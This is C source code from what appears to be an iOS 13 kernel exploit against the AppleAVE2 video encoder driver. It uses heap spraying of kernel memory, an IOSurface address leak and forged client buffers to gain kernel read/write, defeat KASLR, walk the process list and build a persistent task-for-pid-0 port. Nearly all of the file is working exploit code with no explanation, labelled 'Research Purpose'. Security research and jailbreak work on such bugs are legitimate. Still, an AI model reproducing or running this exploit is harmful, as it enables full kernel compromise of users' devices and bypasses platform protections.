//#define printf2(X) {extern void log_toView(const char *input_cstr);log_toView(X);}
//#define printf2 printf

struct paveway_sprayAddrs_pack{
    uint64_t *paveway_sprayAddrs;
    uint32_t paveway_sprayCnt;
};
struct paveway_sprayAddrs_pack *_pack_paveway = 0;
uint32_t _pack_pavewayCnt = 0;

uint64_t hohoo(){
    // LGB at Texas Instrument!
    uint64_t conti_seqno[2] = {0};
    uint64_t *paveway_sprayAddrs = calloc(1, 300 * 8); // 300 is default storage unit count of paveway_sprayAddrs
    uint32_t paveway_sprayCnt = 0;
    while(1){
        uint64_t new_addr = alloc_kernel_40_mem();
        paveway_sprayAddrs[paveway_sprayCnt] = new_addr;
        paveway_sprayCnt ++;
        
        for(int j=0; j<paveway_sprayCnt; j++){
            uint64_t stored_addr = paveway_sprayAddrs[j];
            if((new_addr + 0x30) == stored_addr){
                // If mem right after new_addr is known previously sprayed
               // usleep(200);
                if(!conti_seqno[0]){
                    conti_seqno[0] = new_addr;
                } else if(!conti_seqno[1]){
                    if((conti_seqno[0] != stored_addr) && (conti_seqno[0] != (new_addr - 0x30))){
                        // Avoid store an address that is near prev stored conti_seqno[0] address
                        conti_seqno[1] = new_addr;
                    }
                }
            }
            else if((new_addr - 0x30) == stored_addr){
                // If mem right after new_addr is known previously sprayed
                
                if(!conti_seqno[0]){
                    conti_seqno[0] = stored_addr;
                } else if(!conti_seqno[1]){
                    if((conti_seqno[0] != new_addr) && (conti_seqno[0] != (stored_addr - 0x30))){
                        // Avoid store an address that is near prev stored conti_seqno[0] address
                        conti_seqno[1] = stored_addr;
                    }
                }
            }
        }
        
        if(conti_seqno[1]){
            // Collect enough conti memory spray, paveway stage completed.
            break;
        }
        
        if(!(paveway_sprayCnt % 300)){
            // paveway_sprayAddrs is full, expanding the buf size
            paveway_sprayAddrs = realloc(paveway_sprayAddrs, 8 * (paveway_sprayCnt + 300));
        }
    }
    
    for(int i=0; i<paveway_sprayCnt; i++){
        if(paveway_sprayAddrs[i]){
            if((paveway_sprayAddrs[i] == conti_seqno[0]) || (paveway_sprayAddrs[i] == conti_seqno[1])){
                paveway_sprayAddrs[i] = 0;
            }
        }
    }
    
    if(_pack_paveway == NULL){
        _pack_paveway = calloc(1, 10 * sizeof(struct paveway_sprayAddrs_pack)); // 10 is default storage unit count of paveway_sprayAddrs_pack
        _pack_pavewayCnt = 0;
    }
    
    _pack_paveway[_pack_pavewayCnt].paveway_sprayAddrs = paveway_sprayAddrs;
    _pack_paveway[_pack_pavewayCnt].paveway_sprayCnt = paveway_sprayCnt;
    _pack_pavewayCnt ++;
    
    if(!(_pack_pavewayCnt % 10)){
        // _pack_paveway is full, expanding the buf size
        _pack_paveway = realloc(_pack_paveway, sizeof(struct paveway_sprayAddrs_pack) * (_pack_pavewayCnt + 10));
    }
    /*
    (printf)("conti_seqno[0]: 0x%llx\n", conti_seqno[0]);
    (printf)("conti_seqno[1]: 0x%llx\n", conti_seqno[1]);
    */
    uint64_t real_spray[3] = {0};
    real_spray[0] = conti_seqno[0];
    real_spray[1] = alloc_kernel_40_mem();
    real_spray[2] = conti_seqno[1];
    
    release_kernel_40_mem(real_spray[0]);
    release_kernel_40_mem(real_spray[1]);
    release_kernel_40_mem(real_spray[2]);
    
   /* (printf)("real_spray:\n");
    (printf)("  0: 0x%llx\n", real_spray[0]);
    (printf)("  1: 0x%llx\n", real_spray[1]);
    (printf)("  2: 0x%llx\n", real_spray[2]);
    */
    uint32_t criticle_index = 10;
    
    TT1_send_spray();
    
    uint64_t criticle_records[10] = {0};
    uint64_t leaked_osdata = 0;
    //for(int i=0; i<150; i++){
    for(int i=0; i<120; i++){
    //for(int i=0; i<80; i++){
        uint64_t live_40buf = alloc_kernel_40_mem();
        if(i<criticle_index){
            criticle_records[i] = live_40buf;
        }
        
        if(i == criticle_index){
            // Interfering spray process while hopefully tend to begin showing stable output, so the desired address can stood-out
            TT1_send_spray();
            
            if(criticle_records[0] == criticle_records[2]){
                TT1_sprayid = TT1_sprayid - 1;
                leaked_osdata = real_spray[0];
            }
            else if(real_spray[2] == criticle_records[2]){
                if(real_spray[2] == criticle_records[8]){
                    leaked_osdata = real_spray[2];
                }
            }
            else{
                //(printf)("NOTHING!!!!\n");
                //usleep(10000);
                //printf2("========== RE-Attemp ====\n");
                release_kernel_40_mem(live_40buf);
                leaked_osdata = hohoo();
                return leaked_osdata;
            }
        }
        
        if(i > criticle_index){
            if(leaked_osdata && leaked_osdata == live_40buf){
                // Target address been taken again, indicating was failure attempt, leaked_osdata is a false result
                (printf)("**** 0x%llx Target address been taken again, indicating that was failure attempt.. reattemping...\n", live_40buf);
                leaked_osdata = 0;
                i = 0;
            }
        }
        
       // (printf)("spraymap: 0x%llx\n", live_40buf);
        release_kernel_40_mem(live_40buf);
    }
    return leaked_osdata;
}

uint32_t TT1_hit_holes[TT1_holes_count] = {0};
uint32_t TT1_hit_cnt = 0;

void hohoo222(){
    //printf("hoohoo222\n");
    bzero(TT1_hit_holes, sizeof(TT1_hit_holes));
    TT1_hit_cnt = 0;
    
    uint64_t leaked_osdata = 0;
    while(1){
        leaked_osdata = hohoo();
        //usleep(1000);
        if(leaked_osdata)
            break;
    }
    
    TT2_send_spray();
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD701);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD751);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD7A1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD7F1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD841);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD891);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD8E1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD931);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xD9D1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDA21);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDA71);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDAC1);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDB11);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDB61);
    IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, 0xDBB1);
    
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = leaked_osdata + 0x18;
    alloc_kernel_40_mem_contains_iosurfacebuf();
    empty_kernel_40_mem(leaked_osdata + 0x20);
    
    uint32_t confirm_TT1_sprayid = 0;
    uint8_t failure_case_all7 = 0;
    char *ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid);
    ccc = ccc + 0x10;
    confirm_TT1_sprayid = TT1_sprayid;
    for(int i=0; i<TT1_holes_count; i++){
        char *aaa = ccc + 0x80*i;
        
        if(i == 0){
            kObject_AppleAVE2Driver = *(uint64_t*)(aaa+0x10);
            kObject_IOSurface = *(uint64_t*)(aaa+0x20);
        }
        ////usleep(1000);
        //(printf)("aaa: 0x%x 0x%x\n", *(uint32_t*)(aaa+0x10), *(uint32_t*)(aaa+0x18));
        if(*(uint32_t*)(aaa+0x10) == 0x77777777){
            failure_case_all7 = 1;
            break;
        }
        if(*(uint32_t*)(aaa+0x10) == 0x66666666){
            uint32_t id = *(uint32_t*)(aaa+0x18);
            TT1_hit_holes[TT1_hit_cnt] = id;
            TT1_hit_cnt++;
            
        }
    }
    
    if(failure_case_all7 || (TT1_hit_cnt == 0)){
        failure_case_all7 = 0;
        confirm_TT1_sprayid = TT1_sprayid + 1;
        char *ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid + 1);
        ccc = ccc + 0x10;
        for(int i=0; i<TT1_holes_count; i++){
            char *aaa = ccc + 0x80*i;
            
            if(i == 0){
                kObject_AppleAVE2Driver = *(uint64_t*)(aaa+0x10);
                kObject_IOSurface = *(uint64_t*)(aaa+0x20);
            }
            
            if(*(uint32_t*)(aaa+0x10) == 0x77777777){
                //(printf)("aaa(+1): 0x%x 0x%x\n", *(uint32_t*)(aaa+0x10), *(uint32_t*)(aaa+0x18));
                failure_case_all7 = 1;
                break;
            }
            if(*(uint32_t*)(aaa+0x10) == 0x66666666){
                uint32_t id = *(uint32_t*)(aaa+0x18);
                TT1_hit_holes[TT1_hit_cnt] = id;
                TT1_hit_cnt++;
            }
        }
        
        if(failure_case_all7 || (TT1_hit_cnt == 0))
        {
            failure_case_all7 = 0;
            confirm_TT1_sprayid = TT1_sprayid - 1;
            ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid - 1);
            ccc = ccc + 0x10;
            for(int i=0; i<TT1_holes_count; i++){
                char *aaa = ccc + 0x80*i;
                
                if(i == 0){
                    kObject_AppleAVE2Driver = *(uint64_t*)(aaa+0x10);
                    kObject_IOSurface = *(uint64_t*)(aaa+0x20);
                }
                
                if(*(uint32_t*)(aaa+0x10) == 0x77777777){
                    //(printf)("aaa(-1): 0x%x 0x%x\n", *(uint32_t*)(aaa+0x10), *(uint32_t*)(aaa+0x18));
                    failure_case_all7 = 1;
                    break;
                }
                if(*(uint32_t*)(aaa+0x10) == 0x66666666){
                    uint32_t id = *(uint32_t*)(aaa+0x18);
                    TT1_hit_holes[TT1_hit_cnt] = id;
                    TT1_hit_cnt++;
                }
            }
        }
    }
    
    if(failure_case_all7 || (TT1_hit_cnt == 0)){
        //(printf)("----(EMB) fallL!\n");
        hohoo222();
        //usleep(400);

        return;
    }
    
    TT1_sprayid = confirm_TT1_sprayid;
}

#pragma mark ---- Research Purpose ---- Basic for post-exp

//extern char *Build_resource_path(char *filename);

#define copyfile(X,Y) (copyfile)(X, Y, 0, COPYFILE_ALL|COPYFILE_RECURSIVE|COPYFILE_NOFOLLOW_SRC);

#pragma mark ---- Research Purpose ---- Install tfp0-persis program

uint32_t OFFSET_bsd_info_p_ucred13 = 0x100;

uint64_t KernelLeak_portAddr(uint64_t target_task, uint32_t portname){
    // Leak kernel ipc port stru address of the input port
    
    uint64_t leaked_port_stru_kAddr = 0;
    
    mach_port_t stored_ports[3] = {0};
    stored_ports[0] = mach_task_self();
    stored_ports[2] = portname;
    mach_ports_register(mach_task_self(), stored_ports, 3);
    
    leaked_port_stru_kAddr = KernelRead_8bytes(target_task + OFFSET_task_itk_registered + 0x10);
    
    stored_ports[2] = 0;
    mach_ports_register(mach_task_self(), stored_ports, 3);
    
    return leaked_port_stru_kAddr;
}

uint32_t KernelLeak_portAddr2(uint64_t target_task, uint64_t portStru){
    // Leak kernel ipc port stru address of the input port
    
    mach_port_t *stored_ports = NULL;
    mach_msg_type_number_t stored_portsCnt = 3;
    
    KernelWrite_8bytes(target_task + OFFSET_task_itk_registered + 0x10, portStru);
    
    mach_ports_lookup(mach_task_self(), &stored_ports, &stored_portsCnt);
    uint32_t rt_p = stored_ports[2];
    vm_deallocate(mach_task_self(), (vm_address_t)stored_ports, 4 * stored_portsCnt);
    return rt_p;
}

uint64_t ubc_cs_blob_get(uint64_t vp, int cputype, uint64_t offset){
    
    uint64_t uip = 0; // struct ubc_info *uip;
    uint64_t blob = 0;
    
    if ( vp && KernelRead_2bytes(vp + 112) == 1 && (uip = KernelRead_8bytes(vp + 120)) != 0 ){
        for (blob = KernelRead_8bytes(uip + 80); blob; blob = KernelRead_8bytes(blob)){
            if (cputype != -1 && KernelRead_4bytes(blob + 8) == cputype)
                break;
            if(offset != -1){
                uint64_t offset_in_blob = offset - KernelRead_8bytes(blob + 16);
                if(offset_in_blob >= KernelRead_8bytes(blob + 24) && offset_in_blob < KernelRead_8bytes(blob + 32))
                    break;
            }
        }
    }
    
    return blob;
}


static void clean_up_everything(){
    for(int i=0; i<6; i++){
        remove_client();
    }
}


static void prep_redirect_prev_clientbuf(uint64_t new_prev_clientbuf){
    for(int i=0; i<3; i++){
        *(uint64_t*)(inputmap_InitInfo + 147228) = new_prev_clientbuf; // 0x4000
        *(uint64_t*)(inputmap_InitInfo + 130844) = new_prev_clientbuf; // 0x8000
        *(uint64_t*)(inputmap_InitInfo + 114460) = new_prev_clientbuf; // 0xc000
    }
}

static void prep_fake_clientbuf(uint64_t genuine_UserClient_kobj){
    
    char *forge_clientbuf = inputmap_InitInfo + 0x24000;
    uint64_t forge_clientbuf_kaddr = magic_addr + 0x24000;
    bzero(forge_clientbuf, 0x29B98);
    
    *(uint64_t*)(forge_clientbuf + 0x0) = genuine_UserClient_kobj;
    *(forge_clientbuf + 0x27B58) = 0x1;
    
    char *forge_KernelFrameQueue = forge_clientbuf + 0x29B98;
    uint64_t forge_KernelFrameQueue_kaddr = forge_clientbuf_kaddr + 0x29B98;
    bzero(forge_KernelFrameQueue, 24);
    *(uint64_t*)(forge_clientbuf + 0x27818) = forge_KernelFrameQueue_kaddr;
    
    char *forge_inputmap_FrameInfo = forge_KernelFrameQueue + 24;
    uint64_t forge_inputmap_FrameInfo_kaddr = forge_KernelFrameQueue_kaddr + 24;
    *(uint64_t*)(forge_KernelFrameQueue + 0x10) = forge_inputmap_FrameInfo_kaddr;
    
    *(uint32_t*)(forge_clientbuf + 0x8) = 0x0;
    *(forge_clientbuf + 0x27B59) = 0x0;
    
    *(uint32_t*)(forge_inputmap_FrameInfo + 16) = 0x4569;
    *(uint32_t*)(forge_clientbuf + 0x4FF0 + 112) = 0x1;
    *(uint64_t*)(forge_clientbuf + 0x27838) = forge_inputmap_FrameInfo_kaddr + 0x2A000;
    *(uint64_t*)(forge_inputmap_FrameInfo + 5936) = 0;
}

static void clean_fake_clientbuf(){
    char *forge_clientbuf = inputmap_InitInfo + 0x24000;
    bzero(forge_clientbuf, 0x29B98);
    
    char *forge_KernelFrameQueue = forge_clientbuf + 0x29B98;
    bzero(forge_KernelFrameQueue, 24);
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
}

#pragma mark ---- Research Purpose ---- Install tfp0-persis program

static uint64_t find_port(mach_port_t port){
    uint64_t itkSpace = KernelRead_8bytes(our_task_kAddr + OFFSET_task_itk_space);
    uint64_t isTable = KernelRead_8bytes(itkSpace + OFFSET_ipc_space_is_table);
    
    uint32_t portIdx = port >> 8;
    uint32_t ipcEntrySz = 0x18;
    uint64_t portAddr = KernelRead_8bytes(isTable + (portIdx * ipcEntrySz));
    return portAddr;
}

#pragma mark ---- exp ---- Convert R/W prim to TFP0

void ios13_kernel_pwn(io_connect_t ioconn, io_connect_t surface_ioconn){
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
    
    uint64_t InitInfo_map_addr = 0, InitInfo_map_size = 0;
    InitInfo_surfaceId = IOSurfaceRootUserClient_create_surface_map(surface_ioconn, &InitInfo_map_addr, (uint32_t*)&InitInfo_map_size);
    
    if(!InitInfo_surfaceId){
        (printf)("exp failed!\n");
        exit(1);
    }
    
    //(printf)("InitInfo_surfaceId: 0x%x\n", InitInfo_surfaceId);
    Init_spraydata_for_TT1(InitInfo_surfaceId);
    Init_spraydata_for_TT2(InitInfo_surfaceId);
    
    uint64_t *remap_local_addr = 0;
    Send_overwritting_iosurfaceMap(InitInfo_map_addr, (uint64_t *)&remap_local_addr);
    
    inputmap_InitInfo = (char*)remap_local_addr;
    
    if(setjmp(reattempt_jmpb)){
        //(printf)("RRRReatrmpe 9afioasf..\n");
        clean_up_everything();
    }
    
    add_new_client();
    add_new_client();
    add_new_client();
    add_new_client();
    add_new_client();
    add_new_client();
    add_new_client();
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2020) = 160;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 64;
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 5;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    *(uint8_t*)(inputmap_InitInfo + 13377) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2028) = 1;
    *(uint8_t*)(inputmap_InitInfo + 13288) = 1;
    
    {
        char input_stru[0x110] = {0};
        *(uint32_t*)(input_stru + 8) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 16) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 24) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 28) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 32) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 36) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 40) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 44) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 184) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 188) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 192) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 196) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 200) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 204) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 208) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 212) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 216) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 220) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 224) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 228) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 232) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 236) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 240) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 244) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 248) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 48) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 52) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 56) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 60) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 64) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 68) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 72) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 76) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 80) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 84) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 88) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 92) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 96) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 100) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 104) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 108) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 112) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 116) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 120) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 124) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 128) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 132) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 136) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 140) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 144) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 148) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 152) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 156) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 160) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 164) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 168) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 172) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 176) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 180) = InitInfo_surfaceId;
        
        size_t output_stru_size = 4;
        char output_stru[4] = {0};
        //for(int i=0; i<60; i++){
        for(int i=0; i<80; i++){
            IOConnectCallStructMethod(ioconn, 7, input_stru, 0x110, output_stru, &output_stru_size);
        }
    }
    
    hohoo222();
    
    TT2_send_spray_smallspray(); // seal up remaining hols
    for(int i=0; i<TT1_hit_cnt; i++){
        uint32_t id = TT1_hit_holes[i];
        //(printf)("hit holes id: 0x%x\n", id);
        IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, id);
    }
    
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    uint64_t spareone = alloc_kernel_40_mem_contains_iosurfacebuf();
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = spareone;
    remove_client();
    
    spray_client();
    char *ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid);
    ccc = ccc + 0x10;
    for(int i=0; i<TT1_holes_count; i++){
        char *aaa = ccc + 0x80*i;
        
        if(((*(uint64_t*)(aaa+0x10) == 0) || (*(uint64_t*)(aaa+0x10) == kObject_AppleAVE2Driver)) && (*(uint64_t*)(aaa+0x20) == kObject_IOSurface)){
            magic_addr = *(uint64_t*)(aaa+0x40);
            if(magic_addr)
                break;
        }
    }
    
    if(magic_addr == 0){
        do{
            add_new_client();
            spray_client();
            
            ccc = IOSurfaceRootUserClient_sCopyValue(InitInfo_surfaceId, TT1_sprayid);
            ccc = ccc + 0x10;
            for(int i=0; i<TT1_holes_count; i++){
                char *aaa = ccc + 0x80*i;
                
                if(((*(uint64_t*)(aaa+0x10) == 0) || (*(uint64_t*)(aaa+0x10) == kObject_AppleAVE2Driver)) && (*(uint64_t*)(aaa+0x20) == kObject_IOSurface)){
                    magic_addr = *(uint64_t*)(aaa+0x40);
                    if(magic_addr)
                        break;
                }
            }
            remove_client();
        }while(!magic_addr);
    }
    //(printf)("magic_addr: 0x%llx\n", magic_addr);
    
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    prep_redirect_prev_clientbuf(magic_addr + 0x24000);
    
    add_new_client();
    TT2_release_all();
    
    *(uint32_t*)(inputmap_InitInfo + 13232) = 1;
    encode_client_normal(0);
    *(uint64_t*)(inputmap_InitInfo + 56) = 0;
    empty_kernel_40_mem(kObject_AppleAVE2Driver + 0x400 - 40);
    
    uint64_t last_v = 0;
    uint64_t kObject_clientbuf = 0;
    uint32_t howmany = 0;
    for(;;){
        kObject_clientbuf = temp_kernel_reading_categ3(kObject_AppleAVE2Driver + 0x400);
        kObject_clientbuf |= 0xffffffe000000000;
        //(printf)("kObject_clientbuf_i: 0x%llx\n", kObject_clientbuf);
        if(last_v && (kObject_clientbuf > last_v)){
            if((kObject_clientbuf - last_v) == 0x2c000){
                if((uint16_t)kObject_clientbuf != 0x0000){
                    //printf("Found the right clientbuf! 0x%llx\n", kObject_clientbuf);
                    break;
                }
            }
        }
        if(last_v == 0){
            if((uint16_t)kObject_clientbuf != 0x0000){
               // printf("Found the right clientbuf! 0x%llx\n", kObject_clientbuf);
                break;
            }
        }
        last_v = kObject_clientbuf;
        if(add_new_client() == 1){
            // when client list is full
            printf("client list is full.\n");
            for(int i=0; i<howmany; i++){
                remove_client();
            }
            last_v = 0;
            add_new_client();
            encode_client_normal(0);
            howmany = 1;
            (printf)("exp failed!\n");
            exit(1);
        }
        else{
            // when it's not full
            encode_client_normal(0);
            howmany ++;
        }
    }
    
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    uint64_t the_prev_clientbuf = temp_kernel_reading_categ3(kObject_clientbuf + 0x29b60);
    the_prev_clientbuf |= 0xffffffe000000000;
    //printf("the_prev_clientbuf: 0x%llx\n", the_prev_clientbuf);

    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    *(uint32_t*)(inputmap_InitInfo + 4) = 99;
    uint64_t kObject_AppleAVE2UserClient = temp_kernel_reading_categ5(the_prev_clientbuf);
    kObject_AppleAVE2UserClient |= 0xffffffe000000000;
   // printf("kObject_AppleAVE2UserClient: 0x%llx\n", kObject_AppleAVE2UserClient);
    
    //printf("Setting up new kernel r/w primitives...\n");
    for(int i=0; i<10; i++){prep_fake_clientbuf(kObject_AppleAVE2UserClient);}
    empty_kernel_40_mem(kObject_AppleAVE2Driver + 0x3DA);
    
    uint32_t surface_vtable = (uint32_t)KernelRead_8bytes(kObject_IOSurface);
    kaslr = surface_vtable - (uint32_t)HARDCODED_infoleak_addr;
    //(printf)("kaslr: 0x%x\n", (uint32_t)kaslr);
    
    KernelWrite_8bytes(the_prev_clientbuf, kObject_AppleAVE2UserClient);

    
    
    
    
    uint64_t userClientOwner = KernelRead_8bytes(kObject_AppleAVE2UserClient + 0xa0);
    /*if (KernelRead_8bytes(userClientOwner + 0x18) == kObject_AppleAVE2UserClient){
        printf("Got uco!\n");
    }*/
    uint64_t userClientTask = KernelRead_8bytes(userClientOwner);

    uint64_t anyTask = userClientTask;
    uint64_t anyProc = 0;
    while (anyTask){
        uint64_t proc = KernelRead_8bytes(anyTask + OFFSET_task_bsd_info);
        uint64_t task2 = KernelRead_8bytes(proc + OFFSET_bsd_info_task13);
        
        if (task2 == anyTask && anyTask != userClientTask){
            anyProc = proc;
            break;
        }
        anyTask = KernelRead_8bytes(anyTask + OFFSET_task_prev);
    }

    uint64_t allProc = 0;
    printf("%s","Searching for our_proc & anyProc ...\n");
    while (anyProc != 0) {
        if (!our_proc_kAddr){
            uint32_t pid = KernelRead_4bytes(anyProc + OFFSET_bsd_info_pid13);
            if (pid == getpid()){
                printf("found! our_proc: 0x%llx\n", anyProc);
                our_proc_kAddr = anyProc;
            }
        }
        if (our_proc_kAddr){
            uint64_t nextProc = KernelRead_8bytes(anyProc + 8);
            if (nextProc == 0 || KernelRead_8bytes(nextProc) != anyProc){
                printf("Found allproc! 0x%llx\n", anyProc);
                allProc = anyProc;
                break;
            }
        }
        
        anyProc = KernelRead_8bytes(anyProc + 0x8);
    }

    anyProc = KernelRead_8bytes(allProc);
    uint64_t kernelProc = 0;
    while (anyProc != 0){
        uint32_t pid = KernelRead_4bytes(anyProc + OFFSET_bsd_info_pid13);
        if (pid == 0){
            kernelProc = anyProc;
            break;
        }
        anyProc = KernelRead_8bytes(anyProc);
    }

    uint64_t kernel_task_kAddr = KernelRead_8bytes(kernelProc + OFFSET_bsd_info_task13);
    printf("found! kernel_task: 0x%llx\n", kernel_task_kAddr);

    our_task_kAddr = KernelRead_8bytes(our_proc_kAddr + OFFSET_bsd_info_task13);
    printf("found! our_task: 0x%llx\n", our_task_kAddr);

    uint64_t kernel_map_kAddr = KernelRead_8bytes(kernel_task_kAddr + OFFSET_task_vm_map);
    printf("kernel_map_kAddr: 0x%llx\n", kernel_map_kAddr);

    printf("Setting up tfp0...\n");

    mach_port_t corpse_task = MACH_PORT_NULL;
    task_generate_corpse(mach_task_self_, &corpse_task);

    uint64_t corpse_task_port = find_port(corpse_task);

    uint64_t fake_task = KernelRead_8bytes(corpse_task_port + OFFSET_ipc_port_ip_kobject);

    KernelWrite_8bytes(fake_task + OFFSET_task_vm_map, kernel_map_kAddr);

    if (corpse_task != MACH_PORT_NULL){
        tfp0_port13 = corpse_task;
    }

    printf("tfp0_port13: 0x%x\n", tfp0_port13);

    KernelWrite_8bytes(corpse_task_port + OFFSET_ipc_port_io_references, 0xf00d);
    KernelWrite_8bytes(corpse_task_port + OFFSET_ipc_port_ip_srights, 0xf00d);

    KernelWrite_4bytes(corpse_task + OFFSET_task_ref_count, 99);
    KernelWrite_4bytes(corpse_task + OFFSET_task_message_app_suspended, 1);
    KernelWrite_4bytes(corpse_task + OFFSET_task_active, 1);

    printf("Cleaning Up...\n");

    /*{
        uint64_t retdata = 0;
        vm_size_t outsize = 0x8;
        int kk = vm_read_overwrite(tfp0_port13, 0xfffffff007004000 + kaslr, 0x8, (vm_address_t)&retdata, &outsize);
        printf(" tfp0 test read: (%d)0x%x outdata: 0x%llx\n", kk, kk, retdata);
    }*/

    // shutting down r/w pritmitives..
    KernelWrite_4bytes(kObject_AppleAVE2Driver + 0x400, (uint32_t)(kObject_clientbuf));
    for(int i=0; i<10; i++){clean_fake_clientbuf();}
    for(int i=0; i<7; i++){
        remove_client();
    }
    for(int i=0; i<howmany; i++){
        remove_client();
    }
    IOSurfaceRootUserClient_remove_surface_map(surface_ioconn, InitInfo_surfaceId);
    Send_notify_msg();

    printf("done\n");
    
}
